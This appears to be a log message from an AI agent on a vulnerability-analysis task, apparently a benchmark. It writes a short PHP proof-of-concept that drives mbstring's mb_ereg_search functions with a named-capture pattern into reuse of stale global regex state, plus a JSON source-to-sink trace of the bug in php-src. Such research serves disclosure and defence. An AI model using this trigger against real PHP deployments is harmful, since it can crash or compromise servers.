message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_regex_encoding('UTF-8');
mb_ereg_search_init("中国abc + abc ?!？！字符＃　china string", "(?<a>\\w+)");
mb_ereg_search();
mb_ereg_search_getregs();
mb_ereg_search_regs();
mb_ereg_search_regs();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker provides the search subject that will be retained in module-global state."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker also supplies a named-capture pattern, producing the regex object stored in search_re."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1468,"var":"MBREX(search_re)","code":"if (onig_number_of_names(MBREX(search_re)) > 0) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"The search path iterates over named groups using the global regex object, so the object must remain valid across repeated searches."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_getregs)","line":1592,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... }","note":"The accessor reuses the persistent search_regs state and exposes the last match to the caller."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"Repeated calls keep re-entering the same global state machine and can drive the named-group iteration with the previously stored regex and region pointers."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"mb_regex_groups_iter","line":null,"var":"args->regs","code":"onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args);","note":"The callback consumes the shared match region and string buffer, which is the sink if the regex/global state has become stale."}
]
EOF

